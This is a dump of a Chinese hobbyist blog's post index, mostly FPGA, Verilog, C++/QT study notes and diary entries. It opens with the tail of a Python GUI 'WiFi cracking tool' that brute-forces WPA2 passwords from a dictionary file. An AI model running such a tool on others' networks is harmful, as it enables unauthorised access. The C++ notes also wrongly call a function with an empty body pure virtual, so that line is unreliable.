休眠1秒 # 测试网卡是否属于断开状态 assert self.iface.status() in \\ [const.IFACE_DISCONNECTED, const.IFACE_INACTIVE] def __str__(self): # 自动会调用的函数，返回自身的网卡 return &#x27;(WIFI:%s,%s)&#x27; % (self.wifi, self.iface.name()) # 设置窗口 def set_init_window(self): self.init_window_name.title(&quot;WIFI破解工具&quot;) self.init_window_name.geometry(&#x27;+500+200&#x27;) labelframe = LabelFrame(width=400, height=200, text=&quot;配置&quot;) # 框架，以下对象都是对于labelframe中添加的 labelframe.grid(column=0, row=0, padx=10, pady=10) self.search = Button(labelframe, text=&quot;搜索附近WiFi&quot;, command=self.scans_wifi_list).grid(column=0, row=0) self.pojie = Button(labelframe, text=&quot;开始破解&quot;, command=self.readPassWord).grid(column=1, row=0) self.label = Label(labelframe, text=&quot;目录路径：&quot;).grid(column=0, row=1) self.path = Entry(labelframe, width=12, textvariable=self.get_value).grid(column=1, row=1) self.file = Button(labelframe, text=&quot;添加密码文件目录&quot;, command=self.add_mm_file).grid(column=2, row=1) self.wifi_text = Label(labelframe, text=&quot;WiFi账号：&quot;).grid(column=0, row=2) self.wifi_input = Entry(labelframe, width=12, textvariable=self.get_wifi_value).grid(column=1, row=2) self.wifi_mm_text = Label(labelframe, text=&quot;WiFi密码：&quot;).grid(column=2, row=2) self.wifi_mm_input = Entry(labelframe, width=10, textvariable=self.get_wifimm_value).grid(column=3, row=2,sticky=W) self.wifi_labelframe = LabelFrame(text=&quot;wifi列表&quot;) self.wifi_labelframe.grid(column=0, row=3, columnspan=4, sticky=NSEW) # 定义树形结构与滚动条 self.wifi_tree = ttk.Treeview(self.wifi_labelframe, show=&quot;headings&quot;, columns=(&quot;a&quot;, &quot;b&quot;, &quot;c&quot;, &quot;d&quot;)) self.vbar = ttk.Scrollbar(self.wifi_labelframe, orient=VERTICAL, command=self.wifi_tree.yview) self.wifi_tree.configure(yscrollcommand=self.vbar.set) # 表格的标题 self.wifi_tree.column(&quot;a&quot;, width=50, anchor=&quot;center&quot;) self.wifi_tree.column(&quot;b&quot;, width=100, anchor=&quot;center&quot;) self.wifi_tree.column(&quot;c&quot;, width=100, anchor=&quot;center&quot;) self.wifi_tree.column(&quot;d&quot;, width=100, anchor=&quot;center&quot;) self.wifi_tree.heading(&quot;a&quot;, text=&quot;WiFiID&quot;) self.wifi_tree.heading(&quot;b&quot;, text=&quot;SSID&quot;) self.wifi_tree.heading(&quot;c&quot;, text=&quot;BSSID&quot;) self.wifi_tree.heading(&quot;d&quot;, text=&quot;signal&quot;) self.wifi_tree.grid(row=4, column=0, sticky=NSEW) self.wifi_tree.bind(&quot;&lt;Double-1&gt;&quot;, self.onDBClick) self.vbar.grid(row=4, column=1, sticky=NS) # 搜索wifi def scans_wifi_list(self): # 扫描周围wifi列表 # 开始扫描 print(&quot;^_^ 开始扫描附近wifi...&quot;) self.iface.scan() time.sleep(15) # 在若干秒后获取扫描结果 scanres = self.iface.scan_results() # 统计附近被发现的热点数量 nums = len(scanres) print(&quot;数量: %s&quot; % (nums)) # 实际数据 self.show_scans_wifi_list(scanres) return scanres # 显示wifi列表 def show_scans_wifi_list(self, scans_res): for index, wifi_info in enumerate(scans_res): self.wifi_tree.insert(&quot;&quot;, &#x27;end&#x27;, values=(index + 1, wifi_info.ssid, wifi_info.bssid, wifi_info.signal)) # 添加密码文件目录 def add_mm_file(self): self.filename = tkinter.filedialog.askopenfilename() self.get_value.set(self.filename) # Treeview绑定事件 def onDBClick(self, event): self.sels = event.widget.selection() self.get_wifi_value.set(self.wifi_tree.item(self.sels, &quot;values&quot;)[1]) # 读取密码字典，进行匹配 def readPassWord(self): self.getFilePath = self.get_value.get() self.get_wifissid = self.get_wifi_value.get() pwdfilehander = open(self.getFilePath, &quot;r&quot;, errors=&quot;ignore&quot;) while True: try: self.pwdStr = pwdfilehander.readline() if not self.pwdStr: break self.bool1 = self.connect(self.pwdStr, self.get_wifissid) if self.bool1: self.res = &quot;[*] 密码正确！wifi名：%s，匹配密码：%s &quot; % (self.get_wifissid, self.pwdStr) self.get_wifimm_value.set(self.pwdStr) tkinter.messagebox.showinfo(&#x27;提示&#x27;, &#x27;破解成功！！！&#x27;) print(self.res) break else: self.res = &quot;[*] 密码错误！wifi名:%s，匹配密码：%s&quot; % (self.get_wifissid, self.pwdStr) print(self.res) time.sleep(3) except: continue # 对wifi和密码进行匹配 def connect(self, pwd_Str, wifi_ssid): # 创建wifi链接文件 self.profile = pywifi.Profile() self.profile.ssid = wifi_ssid # wifi名称 self.profile.auth = const.AUTH_ALG_OPEN # 网卡的开放 self.profile.akm.append(const.AKM_TYPE_WPA2PSK) # wifi加密算法 self.profile.cipher = const.CIPHER_TYPE_CCMP # 加密单元 self.profile.key = pwd_Str # 密码 self.iface.remove_all_network_profiles() # 删除所有的wifi文件 self.tmp_profile = self.iface.add_network_profile(self.profile) # 设定新的链接文件 self.iface.connect(self.tmp_profile) # 链接 time.sleep(5) if self.iface.status() == const.IFACE_CONNECTED: # 判断是否连接上 isOK = True else: isOK = False self.iface.disconnect() # 断开 time.sleep(1) # 检查断开状态 assert self.iface.status() in \\ [const.IFACE_DISCONNECTED, const.IFACE_INACTIVE] return isOK def gui_start(): print(&quot;123&quot;) init_window = Tk() ui = MY_GUI(init_window) print(ui) ui.set_init_window() init_window.mainloop() if __name__ == &quot;__main__&quot;: gui_start() print(&quot;123&quot;)","tags":["书籍"],"categories":["项目"]},{"title":"关于Verilog综合时逻辑资源浪费","path":"/2024/08/31/关于Verilog综合时逻辑资源浪费/","content":"问题来源​\t当时我在设计FPGA简易频率计的时候，当编写完等精度测量的频率计算模块的时候，编译综合并没有出现错误，然后将我之前编写的Seg数码管驱动模块导入到项目里面，单独编译综合也是没有问题。但是，当我设计顶层模块并实例化频率计算模块和Seg驱动模块的时候，报错显示逻辑资源不够用！ ​\t那么就奇了怪了，在野火视频教程里面freq_meter_calc模块的资源使用情况并没有这么多，视频显示为2606，而我的使用情况是4436，这个模块的使用量就占据我开发板总资源量的**69%**！！ 并没有解决。不是知道是什么原因，不管怎么样，我要让代码能成功运行的话只能降低寄存器的位宽了，这样会导致测量的频率范围降低。 资源使用情况 代码顶层模块 freq_meter.vmodule freq_meter ( input wire sys_clk , //系统时钟,频率50MHz input wire sys_rst_n , //复位信号,低电平有效 input wire clk_test, output wire [7:0]segdata, output wire [2:0]segcs ); //wire define wire [33:0] freq ; //计算得到的待检测信号时钟频率 //------------- freq_meter_calc_inst -------------- freq_meter_calc freq_meter_calc_inst ( .sys_clk (sys_clk ), //系统时钟,频率50MHz .sys_rst_n (sys_rst_n ), //复位信号,低电平有效 .clk_test (clk_test ), //待检测时钟 .freq (freq ) //待检测时钟频率 ); //------------- seg_595_dynamic_inst -------------- seg seg_inst ( .clk(sys_clk), .rst_n(sys_rst_n), .tenvalue(freq), // 这里连接没有问题 .segdata(segdata), .segcs(segcs) ); endmodule 数码管驱动模块 seg.v/* 数码管显示驱动，目前是直接设置固定数据 通过将tenvalue设置到输入端口，可以作为子模块，通过传入数据显示在数码管上面 */ module seg( input clk, input rst_n, input [33:0]tenvalue, output reg [7:0]segdata, output reg [2:0]segcs ); reg[31:0] count; reg[24:0]count1ms; reg[2:0]number; reg clk1ms; parameter sample=2&#x27;b00, display=2&#x27;b01; //-----------数码管驱动时钟----------- always@(posedge clk or negedge rst_n) begin if (!rst_n)begin count1ms &lt;= 1&#x27;d0; clk1ms &lt;= 1&#x27;d0; end else if(count1ms &gt;= 25&#x27;d50000) // 1ms的计数器 begin clk1ms &lt;= ~clk1ms; count1ms &lt;= 1&#x27;d0; end else count1ms &lt;= count1ms + 1&#x27;d1; end //-----------数码管译码----------- function [7:0] leddata; input [3:0] datain; begin case(datain) 4&#x27;d0: leddata = 8&#x27;b11000000; // 0 4&#x27;d1: leddata = 8&#x27;b11111001; // 1 4&#x27;d2: leddata = 8&#x27;b10100100; // 2 4&#x27;d3: leddata = 8&#x27;b10110000; // 3 4&#x27;d4: leddata = 8&#x27;b10011001; // 4 4&#x27;d5: leddata = 8&#x27;b10010010; // 5 4&#x27;d6: leddata = 8&#x27;b10000010; // 6 4&#x27;d7: leddata = 8&#x27;b11111000; // 7 4&#x27;d8: leddata = 8&#x27;b10000000; // 8 4&#x27;d9: leddata = 8&#x27;b10010000; // 9 4&#x27;d11: leddata = 8&#x27;b01111111; // . default: leddata = 8&#x27;b11111111; endcase end endfunction //-----------数码管扫描----------- always@(posedge clk1ms or negedge rst_n) begin if(!rst_n) number &lt;= 3&#x27;d0; else if(number == 3&#x27;d3) number &lt;= 3&#x27;d0; else number &lt;= number + 1; case(number) 3&#x27;d0: begin segdata &lt;= leddata(tenvalue % 10); // 个位 segcs &lt;= 3&#x27;b101; end 3&#x27;d1: begin segdata &lt;= leddata((tenvalue / 10) % 10); // 十位 segcs &lt;= 3&#x27;b100; end 3&#x27;d2: begin segdata &lt;= leddata((tenvalue / 100) % 10); // 百位 segcs &lt;= 3&#x27;b011; end 3&#x27;d3: begin segdata&lt;=leddata((tenvalue/1000)%10);//千位 segcs&lt;=3&#x27;b010; end default: begin segdata &lt;= 8&#x27;b11111111; // 或者其他默认值 segcs &lt;= 3&#x27;b111; // 或者其他默认值 end endcase end endmodule 等精度测量法频率测量模块 freq_meter_calc.v`timescale 1ns/1ns //////////////////////////////////////////////////////////////////////// // Author : EmbedFire // Create Date : 2019/07/10 // Module Name : freq_meter_calc // Project Name : freq_meter // Target Devices: Altera EP4CE10F17C8N // Tool Versions : Quartus 13.0 // Description : 频率计算模块 // // Revision : V1.0 // Additional Comments: // // 实验平台: 野火_征途Pro_FPGA开发板 // 公司 : http://www.embedfire.com // 论坛 : http://www.firebbs.cn // 淘宝 : https://fire-stm32.taobao.com //////////////////////////////////////////////////////////////////////// module freq_meter_calc ( input wire sys_clk , //系统时钟,频率50MHz input wire sys_rst_n , //复位信号,低电平有效 input wire clk_test , //待检测时钟 output reg [33:0] freq //待检测时钟频率 ); //********************************************************************// //****************** Parameter And Internal Signal *******************// //********************************************************************// //parameter define parameter CNT_GATE_S_MAX = 28&#x27;d74_999_999 , //软件闸门计数器计数最大值 CNT_RISE_MAX = 28&#x27;d12_500_000 ; //软件闸门拉高计数值 parameter CLK_STAND_FREQ = 28&#x27;d100_000_000 ; //标准时钟时钟频率 //wire define wire clk_stand ; //标准时钟,频率100MHz wire gate_a_fall_s ; //实际闸门下降沿(标准时钟下) wire gate_a_fall_t ; //实际闸门下降沿(待检测时钟下) //reg define reg [27:0] cnt_gate_s ; //软件闸门计数器 reg gate_s ; //软件闸门 reg gate_a ; //实际闸门 reg gate_a_stand ; //实际闸门打一拍(标准时钟下) reg gate_a_test ; //实际闸门打一拍(待检测时钟下) reg [47:0] cnt_clk_stand ; //标准时钟周期计数器 reg [47:0] cnt_clk_stand_reg ; //实际闸门下标志时钟周期数 reg [47:0] cnt_clk_test ; //待检测时钟周期计数器 reg [47:0] cnt_clk_test_reg ; //实际闸门下待检测时钟周期数 reg calc_flag ; //待检测时钟时钟频率计算标志信号 reg [63:0] freq_reg ; //待检测时钟频率寄存 reg calc_flag_reg ; //待检测时钟频率输出标志信号 //********************************************************************// //***************************** Main Code ****************************// //********************************************************************// //cnt_gate_s:软件闸门计数器 always@(posedge sys_clk or negedge sys_rst_n) if(sys_rst_n == 1&#x27;b0) cnt_gate_s &lt;= 28&#x27;d0; else if(cnt_gate_s == CNT_GATE_S_MAX) cnt_gate_s &lt;= 28&#x27;d0; else cnt_gate_s &lt;= cnt_gate_s + 1&#x27;b1; //gate_s:软件闸门 always@(posedge sys_clk or negedge sys_rst_n) if(sys_rst_n == 1&#x27;b0) gate_s &lt;= 1&#x27;b0; else if((cnt_gate_s&gt;= CNT_RISE_MAX) &amp;&amp; (cnt_gate_s &lt;= (CNT_GATE_S_MAX - CNT_RISE_MAX))) gate_s &lt;= 1&#x27;b1; else gate_s &lt;= 1&#x27;b0; //gate_a:实际闸门 always@(posedge clk_test or negedge sys_rst_n) if(sys_rst_n == 1&#x27;b0) gate_a &lt;= 1&#x27;b0; else gate_a &lt;= gate_s; //cnt_clk_stand:标准时钟周期计数器,计数实际闸门下标准时钟周期数 always@(posedge clk_stand or negedge sys_rst_n) if(sys_rst_n == 1&#x27;b0) cnt_clk_stand &lt;= 48&#x27;d0; else if(gate_a == 1&#x27;b0) cnt_clk_stand &lt;= 48&#x27;d0; else if(gate_a == 1&#x27;b1) cnt_clk_stand &lt;= cnt_clk_stand + 1&#x27;b1; //cnt_clk_test:待检测时钟周期计数器,计数实际闸门下待检测时钟周期数 always@(posedge clk_test or negedge sys_rst_n) if(sys_rst_n == 1&#x27;b0) cnt_clk_test &lt;= 48&#x27;d0; else if(gate_a == 1&#x27;b0) cnt_clk_test &lt;= 48&#x27;d0; else if(gate_a == 1&#x27;b1) cnt_clk_test &lt;= cnt_clk_test + 1&#x27;b1; //gate_a_stand:实际闸门打一拍(标准时钟下) always@(posedge clk_stand or negedge sys_rst_n) if(sys_rst_n == 1&#x27;b0) gate_a_stand &lt;= 1&#x27;b0; else gate_a_stand &lt;= gate_a; //gate_a_fall_s:实际闸门下降沿(标准时钟下) assign gate_a_fall_s = ((gate_a_stand == 1&#x27;b1) &amp;&amp; (gate_a == 1&#x27;b0)) ? 1&#x27;b1 : 1&#x27;b0; //cnt_clk_stand_reg:实际闸门下标志时钟周期数 always@(posedge clk_stand or negedge sys_rst_n) if(sys_rst_n == 1&#x27;b0) cnt_clk_stand_reg &lt;= 32&#x27;d0; else if(gate_a_fall_s == 1&#x27;b1) cnt_clk_stand_reg &lt;= cnt_clk_stand; //gate_a_test:实际闸门打一拍(待检测时钟下) always@(posedge clk_test or negedge sys_rst_n) if(sys_rst_n == 1&#x27;b0) gate_a_test &lt;= 1&#x27;b0; else gate_a_test &lt;= gate_a; //gate_a_fall_t:实际闸门下降沿(待检测时钟下) assign gate_a_fall_t = ((gate_a_test == 1&#x27;b1) &amp;&amp; (gate_a == 1&#x27;b0)) ? 1&#x27;b1 : 1&#x27;b0; //cnt_clk_test_reg:实际闸门下待检测时钟周期数 always@(posedge clk_test or negedge sys_rst_n) if(sys_rst_n == 1&#x27;b0) cnt_clk_test_reg &lt;= 32&#x27;d0; else if(gate_a_fall_t == 1&#x27;b1) cnt_clk_test_reg &lt;= cnt_clk_test; //calc_flag:待检测时钟时钟频率计算标志信号 always@(posedge sys_clk or negedge sys_rst_n) if(sys_rst_n == 1&#x27;b0) calc_flag &lt;= 1&#x27;b0; else if(cnt_gate_s == (CNT_GATE_S_MAX - 1&#x27;b1)) calc_flag &lt;= 1&#x27;b1; else calc_flag &lt;= 1&#x27;b0; //freq_reg:待检测时钟信号时钟频率寄存 always@(posedge sys_clk or negedge sys_rst_n) if(sys_rst_n == 1&#x27;b0) freq_reg &lt;= 64&#x27;d0; else if(calc_flag == 1&#x27;b1) freq_reg &lt;= (CLK_STAND_FREQ * cnt_clk_test_reg / cnt_clk_stand_reg); //calc_flag_reg:待检测时钟频率输出标志信号 always@(posedge sys_clk or negedge sys_rst_n) if(sys_rst_n == 1&#x27;b0) calc_flag_reg &lt;= 1&#x27;b0; else calc_flag_reg &lt;= calc_flag; //freq:待检测时钟信号时钟频率 always@(posedge sys_clk or negedge sys_rst_n) if(sys_rst_n == 1&#x27;b0) freq &lt;= 34&#x27;d0; else if(calc_flag_reg == 1&#x27;b1) freq &lt;= freq_reg[33:0]; //********************************************************************// //*************************** Instantiation **************************// //********************************************************************// //---------- clk_gen_inst ---------- clk_gen clk_gen_inst ( .areset (~sys_rst_n ), .inclk0 (sys_clk ), .c0 (clk_stand ) ); endmodule","tags":["FPGA疑难杂症"],"categories":["FPGA"]},{"title":"都做梦了，还梦这么保守","path":"/2024/08/31/都做梦了，还梦这么保守/","content":"这些天现在，坐在实验室里面，从早上9:30来到实验室开的门，到现在，已经是下午4点整了。一天又要过去了，感觉什么也没有做，就是不知道这么长时间都在做什么，好像好几天都是这样。是不是真的该休息一下了。（弄完就去健身房溜达一圈，也两天没去了） 这些天，不对，是这段时间都挺累的，emm，也不算累吧，就是感觉比较空加上焦虑。第一就是找不到实习，有很大的挫败感，在实验室待了2年多，几乎把之前的那些娱乐项目全都扔弃了（足球、滑板等），然后吧咱就一直做项目，打比赛，拿奖项，但是到发挥它的作用的时候，竟然一个月给我三四千！！！我不能接受！！真的是“五千块钱的农民工招不到，三千块钱的本科生招一屋子” 另一个就是关于FPGA了，感觉还是差了点意思，但是现在一动脑子，不是脑子疼就是焦虑情绪涌上来。 这些天也总是做梦。大部分梦好像也都是在做一些关于FPGA的事情，咱就是说了，既然都是在做梦了，咋还梦这么保守~"},{"title":"关于“快餐式”的开发","path":"/2024/08/31/关于“快餐式”的开发/","content":"在学习和工作过程中，确实存在一种现象，那就是许多人在通信或软件工程领域，一旦实现了基本的功能，就认为万事大吉，任务完成了。他们很少深入研究信号的波形，或者深入思考信号与设计预期之间的差异。然后咱们再去改进、反馈这个过程。这种态度可能会限制个人和团队在技术深度和创新能力上的发展。它到底和我设计的有没有什么不一样，绝大多数人都没有，包括我也没有这个习惯，只不过是我看了一个聊关于开发的一个博主说的，我才意识到，这真的是一个值得讨论的问题。 别说在上板验证的时候已经写了testbanch去仿真了。仿真只是仿真，并非板子真正发出来的信号，一些物理因素造成的噪音，不去用示波器真正的查看，是很难去发现的。 相信大家在学习数字电路知识的时候，或多或少会看到过电路动态特性的内容，书上也可能说：电路在物理世界中存在信号的传输存在时间延时，脉冲沿的基准时间定位在上升沿和下降沿的50%处。··· 传输延时时间$t_pLH$和$t_pHL$、脉冲宽度$t_w$等等。 例如我们在一个串口通信的时候，发送高电平的时候，拉高是需要时间的，而在仿真的时候，是发现不了这个问题的。即使发现了这个问题，大家可能也会联想到之前在数字电路知识的时候看到内容，脑海中依稀可以糊弄过去。 而这个问题同样可以衍生出： 为什么在拉高电平的时候是斜着的？ 拉高的时间跟什么有关系？ 怎么样削弱这段时间？ 实际产生延时的原因：上拉电阻的大小，上拉电阻越大，延时越高","tags":["blog"],"categories":["blog"]},{"title":"黄执中《情绪沟通》","path":"/2024/08/31/黄执中《情绪沟通》/","content":"黄执中《情绪沟通》——学习笔记 - 知乎 (zhihu.com) 2018-10-06-5混沌学霸说_哔哩哔哩_bilibili","tags":["情绪沟通、软实力"],"categories":["软实力提升"]},{"title":"电子圣经《电子学第三版》","path":"/2024/08/31/电子圣经《电子学第三版》/","content":"下载地址https://zikwq.lanzout.com/ijooB1y6n97g","tags":["电子书籍"],"categories":["书籍"]},{"title":"小插曲","path":"/2024/08/31/小插曲/","content":"1. 一连串损坏了两个OLED屏幕在学习通信接口的时候，想着拿点简单的模块来真正的实验一下，结果找来了一块7Pin OLED屏幕，因为这块屏幕默认是使用SPI协议的。但是我需要使用IIC协议来驱动显示几个字符。所以我就跟着网上说的，将背面的一个贴片电阻摘掉换在了另一个位置。问题就处在这，我要用热风枪将电阻摘掉，但是热风枪一吹温度过高，就会将屏幕损坏掉。 这是第二块出现问题的屏幕 想起来第一块的时候也是在同一天，电阻吹掉后，我也没测试，就将相关的线插到FPGA上，结果不知道是我不小心插错了一根线还是在焊接的时候碰到了不该碰的元器件造成短路，结果烧进去程序后并没有反应。我的手碰到屏幕的时候，一阵刺痛传到脑袋上（感觉温度在90摄氏度以上~~）。然后猛地拔线！！","tags":["blog"],"categories":["blog"]},{"title":"Hello 开箱全新博客！","path":"/2024/08/31/博客学习/","content":"Stellar：开始您全新的博客之旅 - XAOXUU"},{"title":"AD学习笔记-快捷键","path":"/2024/08/31/AD学习笔记-快捷键/","content":"快捷键 作用 全选+A+P 控制元器件文本位置 I+L 交叉选择模式，在原理图中框选后可以在PCB中运动整个模块 F5 设置的焊盘颜色开关 N 关闭选择的飞线 Ctrl+D 显示设置 高速PCB设计的时候，需要通过单端阻抗、差分阻抗来计算线宽线距。 计算网址：嘉立创阻抗计算 (jlc.com) PCB规则及约束编辑器 差分对的规则"},{"title":"毕业","path":"/2024/08/31/“毕业”/","content":"2024.5.30昨天晚上在学校遛弯的时候，看到很多人往大活走，心里就大概知道那边肯定有什么讲座啥的，所以我跟我的小伙伴就跟着他们往里面走了。 ​\t走到里面，确实是有讲座，但是奈何我们没有邀请函加上不知道什么情况，所以光明正大的走正门可能有点不太好，所以我们就若无其事的上了二楼去拜访了我的一位老朋友，我猜在那里面练吉他呐，聊了一会天，就从二楼后门大步往里面走，找到座位就直接坐了下去。 ​\t然后就被迫跨专业毕业了哈哈 Your browser does not support the video tag.","tags":["blog"],"categories":["blog"]},{"title":"QT学习笔记","path":"/2024/08/31/QT学习笔记/","content":"第一部分：C++基础知识学习目标，将学习FPGA的同时，把相关的练手项目通过RS232串口与PC上位机通信，增加项目可扩展性，例如我们的DDS信号发生器，通过上位机控制输出的波形， 例如简易的电压表、后续的多串口数据采集等等。利用QT的项目，在学习FPGA的同时学习一下C++的用法，毕竟后续FPGA进阶到ZYNQ的时候需要使用C&#x2F;C++编程一些内容。 1. 什么是C++C++是C语言的升级版，在C的基础上增加了很多功能，是一种高级的语言 2. 什么是面向过程，什么又是面向对象C语言就是面向过程的，而C++是面向对象的 举例：a+b 直接计算a+b就是面向过程的 面向对象就是给a+b穿上了一层衣服，而不是直接计算a+b。 3. C++的灵魂，C++的类类可以看作C语言结构体的升级版，类的成员不仅可以是变量，也可以是函数。 4. 如何定义一个类class student &#123; public: // 修饰符 char name[64]; int age; &#125; 5. 什么是对象对象是类的实例化 6. 如何定义一个对象直接定义 student my // student 就是类， my 就是对象 在堆里面定义 stdent *my1 = new student; // 指针类型的 删除对象 delete my1; // 只能删除在堆里面定义的对象，目的是释放内存 7. 如何访问类的成员student *my = new student; my.age = 18; my -&gt; age = 19; cout &lt;&lt; my.age &lt;&lt; emdl; cout &lt;&lt; my1 -&gt; age &lt;&lt; endl; 访问方法和C语言一样，普通变量直接通过 “.” 来访问，指针通过“- &gt;”访问 8. 类的函数成员因为类的成员不仅可以是变量，也可以是函数 第一步：在类里面声明 第二步：实现这个函数。我们可以直接在类的里面写，也可以写在类的外面 // 在类里面实现函数 class student &#123; public: char name [64]; int age ; void test() &#123; cout &lt;&lt; 123 &lt;&lt; endl; &#125;; &#125;; // 在类的外面实现函数 class student &#123; public: char name [64]; int age ; void test(); &#125;; void student::test() // student:: 表示属于这个类里面的函数，不加的话会被识别为普通的函数 &#123; cout &lt;&lt; 123 &lt;&lt; endl; &#125; 9. 类的访问修饰符类的访问修饰符就是对类的成员进行权限管理 public：表示函数和变量是公开的，任何人都能访问。 private： 表示函数和变量只能在自己的类里面自己访问自己，不能通过对象来访问。 当强行访问private修饰的变量时，需要绕一个弯，也就是通过类里面的函数访问私有的变量，然后通过对象来访问这个函数（通过公有来访问私有） protected：表示函数和变量只能在自己的类里面自己访问自己，但是可以被派生类来访问的。 10. 类函数的重载特性类函数的重载特性就是说我们可以在类里面定义同名的函数，但是参数不同的函数。 class student &#123; public: void test(); void test(int a); &#125;; void student::test()&#123;&#125;; void student::test()&#123;&#125;; 重载函数在调用的时候，会自动判断函数的类型从而匹配调用不同的函数 11. 构造函数和析构函数析构函数：假如我们定义了析构函数，那么当对象被删除或者生命周期结束的时候，就会触发析构函数。 构造函数：假如我们定义了构造函数，那么当对象被调用的时候就会触发这个函数，类似与python类中的def init(self) 在定义析构函数和构造函数时： 析构函数和构造函数的名字必须和类名一模一样。 析构函数要在前面加上一个”~“ class student &#123; public: student(); void test(); void test(int a); ~student(); &#125;; // 构造函数 student::student()&#123; cout &lt;&lt; &quot;Hello&quot; &lt;&lt; endl; &#125; // 析构函数 student::~student()&#123; cout &lt;&lt; &quot;Bye&quot; &lt;&lt; endl; &#125; 其中构造函数是可以被重载的，而析构函数不可以被重载 #include &lt;iostream&gt; using namespace std; class student &#123; public: student(); student(int a); void test(); void test(int a); ~student(); &#125;; // 构造函数1 student::student()&#123; cout &lt;&lt; &quot;Hello&quot; &lt;&lt; endl; &#125; // 构造函数2 student::student(int a)&#123; cout &lt;&lt; a &lt;&lt; endl; &#125; // 析构函数 student::~student()&#123; cout &lt;&lt; &quot;Bye&quot; &lt;&lt; endl; &#125; void student::test()&#123; int haha = 100; cout &lt;&lt; haha &lt;&lt; endl; &#125; void student::test(int a)&#123; cout &lt;&lt; a &lt;&lt; endl; &#125; int main() &#123; student my; student *my1 = new student(10);// 使用指针来构造对象，传入参数就可以来实现重载构造函数的功能 my.test(50); my.test(); return 0; &#125; 12. 类的继承什么是类的继承？ 类的继承允许我们在新的类里面继承父类的public还有protected部分，而private是不能继承的。 当我们觉得这个类不好的时候，就可以使用类的继承，添加我们的功能。 格式： class 儿子 : public 爸爸&#123; public: ....... &#125;; 例如： class mystudent : public student&#123; public: int grade; &#125;; 如何在子类里面访问父类里面的成员？ 也是通过“.”或者“- &gt;”来访问的 13. 虚函数和纯虚函数虚函数：有实际定义的，允许派生类对他进行覆盖式的替换，virtual来修饰 纯虚函数：没有实际定义的虚函数就是纯虚函数 virtual void test(); // 虚函数 virtual void test1()&#123;&#125;; // 纯虚函数 怎么定义一个虚函数 用virtual来修饰，虚函数是用在类的继承上的。 例子： #include &lt;iostream&gt; using namespace std; class student &#123; public: student(); student(int a); virtual void test(); void test(int a); ~student(); &#125;; class mystudent : public student&#123; public: void test()&#123; cout &lt;&lt; 123456 &lt;&lt; endl; &#125; &#125;; // 构造函数1 student::student()&#123; cout &lt;&lt; &quot;Hello&quot; &lt;&lt; endl; &#125; // 构造函数2 student::student(int a)&#123; cout &lt;&lt; a &lt;&lt; endl; &#125; // 析构函数 student::~student()&#123; cout &lt;&lt; &quot;Bye&quot; &lt;&lt; endl; &#125; void student::test()&#123; int haha = 100000; cout &lt;&lt; haha &lt;&lt; endl; &#125; void student::test(int a)&#123; cout &lt;&lt; a &lt;&lt; endl; &#125; int main() &#123; student my; mystudent my2; my2.test(); my.test(); return 0; &#125; 输出部分： Hello Hello 123456 100000 Bye Bye 可以看到在my2的对象上，test打印出来的内容被覆盖成123456，原本父类的test打印的内容是100000 虚函数的优点？ 可以使用虚函数预留接口，实现分工合作！ 第二部分：QT部分","tags":["C++","QT"],"categories":["QT","C++"]},{"title":"TO DO LIST","path":"/2024/08/31/TO DO LIST/","content":"@近期事物考试 机器学习 2024-06-18(14:00-15:30) 3教学楼201 无线通信技术 2024-06-07(09:50-11:20) 4教学楼109 信息论与编码 2024-05-31(09:50-11:20) 3教学楼105 四级考试 2024-06-15 答辩 大创结项答辩 2024-6-6(10:00-结束) 6教学楼305 @2024.5.20-2024.5.26（第一周） 把宿舍的网线拿过来，准备开始以太网协议的设计与实战项目：FPGA通过UDP协议想PC端发送大量的数据，从PC端观察接收到的数据量 重新复习野火FPGA基础部分，重点复习低速通信接口，结合不同串口类型的传感器进行上板验证（7脚OLED屏幕SPI、IIC）（UART串口传图） 复习常用IP核的使用。ROM、RAM、FIFO 学习新知识。图像滤波常用算法：边缘检测等 动手实践。完成HDMI时序程序，学会阅读芯片手册或者协议手册：如FPGA学习日记（六）HDMI协议_hdmi握手协议-CSDN博客，0.96寸OLED显示屏驱动手册（SSD1306） - 提货人 - 博客园 (cnblogs.com) 大创ppt和结项书等工作完成 @2024.5.18 上午去驾校学车 整理数字示波器中的程序，理解里面的程序以及FFT IP核的使用方法并编写博客文档进行记录 完成部分串口协议的专栏分区部分：FPGA面试题系列018：常用通信协议 小白视频传输上位机的学习使用 把宿舍的网线拿过来，准备开始以太网协议的设计与实战项目：FPGA通过UDP协议想PC端发送大量的数据，从PC端观察接收到的数据量 《数字信号处理的集成电路FPGA实现技术》P162中提到的正弦波频率范围为1-10khz，频率分辨率为30HZ，这里频率范围和频率分辨率是什么意思？ 频率范围：指的是正弦波可以产生的频率的最小值和最大值之间的区间。在这个例子中，频率范围是1kHz（千赫兹）到10kHz，意味着正弦波的频率可以在1000Hz到10000Hz之间变化。 频率分辨率：指的是在频率范围内，正弦波频率变化的最小单位。在这个例子中，频率分辨率是30Hz，意味着正弦波的频率可以以30Hz为步长进行变化。也就是说，正弦波的频率可以是1000Hz、1030Hz、1060Hz等，每次变化至少是30Hz的整数倍。 @2024.5.18FPGA 复习ADC、DAC芯片，完成并行和串行芯片的驱动程序 学习寄存器移位拼接的使用方法：清风电子-数字基础 整理数字示波器中的程序，理解里面的程序以及FFT IP核的使用方法并编写博客文档进行记录 完成部分串口协议的专栏分区部分：FPGA面试题系列018：常用通信协议 小白视频传输上位机的学习使用 生活 清洗一下自行车 把宿舍的网线拿过来，准备开始以太网协议的设计与实战项目：FPGA通过UDP协议想PC端发送大量的数据，从PC端观察接收到的数据量 中午闹铃定时，去预约驾校班车准备练车，在不练车就毕业了！！ @2024.5.17 学习两个串口通信协议：IIC、 SPI 整理桌面","tags":["blog"],"categories":["blog"]},{"title":"FPGA学习笔记","path":"/2024/08/31/FPGA学习笔记/","content":"FPGA入门介绍第一部分：FPGA是什么1. FPGA概念，名词解释。FPGA中文名称“现场可编程门阵列”，是一种可重复变成的器件，是在PAL（可编程逻辑阵列）、GAL（通用阵列逻辑）、CPLD（复杂可贬称逻辑器件）等传统逻辑电路和门阵列的基础上发展起来的一种半定制电路，主要应用在ASIC（专用集成电路）领域，即解决了半定制电路的不足，又克服了原有可编程器件门电路有限的缺点，其重要的特点是“可重复编程、低功耗、低时延、算力强”。 2. 